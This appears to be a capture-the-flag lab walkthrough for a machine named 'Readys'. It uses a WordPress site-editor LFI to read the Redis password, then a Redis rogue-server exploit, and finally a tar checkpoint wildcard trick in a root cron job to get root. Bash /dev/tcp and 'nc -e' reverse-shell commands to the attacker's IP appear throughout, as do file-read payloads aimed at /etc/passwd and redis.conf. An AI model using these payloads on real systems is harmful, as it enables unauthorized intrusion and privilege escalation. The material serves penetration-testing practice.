##### Tags: `redis`  `LFI`  `tar`  `wpscan`  `wordpress`  `cron job`

# 🐧Readys🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.242.166

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is wordpress page  
run wpscan found site-editor plugin vulnerable
```console
$ wpscan --url http://192.168.242.166 --no-update

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.242.166/ [192.168.242.166]
[+] Started: Tue Mar 17 22:01:50 2026

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.242.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
```
search and found we have LFI  
https://www.exploit-db.com/exploits/44340
```console
http://192.168.242.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000::/home/alice:/bin/bash
```
port 6379 is redis  
the config file is in /etc/redis/redis.conf  
we can read it and found the password
```console
http://192.168.242.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf

Ready4Redis?
```
login with https://github.com/vulhub/redis-rogue-getshell/blob/master/redis-master.py  
so file from https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so
```console
python3 redis-master.py -r 192.168.242.166 -L 192.168.45.188 -P 6379 -f exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.45.188/22 0>&1'" -a 'Ready4Redis?'

$ penelope -p 22                                                                                        
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.188
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from readys 192.168.242.166 Linux-x86_64 👤 redis(107) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
redis@readys:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```
the wp is owned by alice  
we just need to upload a reverse shell script and execute it as alice
create a script in redis which is own by current user
```console
<?php
$output=null;
$retval=null;
exec(‘nc -e /bin/bash 192.168.45.188 6379’, $output, $retval);
echo “Returned with Status $retval and output:\n”;
print_r($output);
?>
```
execute it via the LFI function
```console
192.168.242.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/shell.php


$ penelope -p 6379
[+] Listening for reverse shells on 0.0.0.0:6379 →  127.0.0.1 • 10.0.2.15 • 192.168.45.188
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from readys 192.168.242.166 Linux-x86_64 👤 alice(1000) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/readys~192.168.242.166-Linux-x86_64/2026_03_17-23_13_13-915.log
alice@readys:/var/www/html/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```
## Privilege Escalation
there is a cronjob running by root every 3 minutes
```console
alice@readys:/var/www/html$ cat /usr/local/bin/backup.sh
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```
since we owned the directory  
https://gtfobins.org/gtfobins/tar/#shell  
we can just follow the instruction and create a reverse shell payload
```console
alice@readys:/var/www/html$ cat exploit.sh
#!/bin/bash

nc -e /bin/sh 192.168.45.188 80
```
```console
alice@readys:/var/www/html$ chmod +x exploit.sh
alice@readys:/var/www/html$ touch ./"--checkpoint=1"
alice@readys:/var/www/html$ touch ./"--checkpoint-action=exec=bash exploit.sh"
```
wait for 3 minutes
```console
$ penelope -p 80
[+] Listening for reverse shells on 0.0.0.0:80 →  127.0.0.1 • 10.0.2.15 • 192.168.45.188
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from readys 192.168.242.166 Linux-x86_64 👤 root(0) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@readys:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```














\

```
